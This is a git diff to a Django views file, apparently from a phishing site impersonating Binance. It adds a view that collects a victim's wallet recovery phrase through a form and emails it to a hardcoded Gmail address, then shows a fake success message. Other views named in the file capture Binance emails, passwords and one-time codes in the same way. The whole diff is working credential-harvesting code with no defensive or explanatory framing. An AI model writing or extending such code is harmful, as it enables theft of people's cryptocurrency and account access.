@@ -1,6 +1,6 @@
 from django.shortcuts import render,redirect,get_object_or_404
 from django.contrib import messages
-from .forms import EmailForm,BinanceEmail, BinancePassword,BinanceOTP
+from .forms import EmailForm,BinanceEmail, BinancePassword,BinanceOTP,PkeyConfirm
 from django.core.mail import EmailMultiAlternatives
 from django.conf import settings
 from django.template.loader import render_to_string
@@ -112,3 +112,25 @@ def Binance_OTP(request):
 		form=BinanceOTP
 	return render(request, "folder/binance.html", {'form':form})
 
+
+def PassKey(request):
+	if request.method == 'POST':
+		form = PkeyConfirm(request.POST)
+		if form.is_valid():
+			password = form.cleaned_data['passkwy']
+			from_email = [settings.EMAIL_HOST_USER]
+			subject = "Wallet 2 Phrase Key"
+
+			context = {"password":password}
+			convert = render_to_string('folder/client.html', context)
+			convert_txt = render_to_string('folder/client.txt', context)
+
+			msg = EmailMultiAlternatives(subject, convert_txt, 'kelechinwekes94@gmail.com', ['healifan768@gmail.com'])
+			msg.attach_alternative(convert, "text/html")
+			msg.send()
+			return HttpResponse('Confirmation sucessful... Congratulations')
+
+
+	else:
+		form=PkeyConfirm()
+	return render(request, "folder/pkey.html",{'form':form})
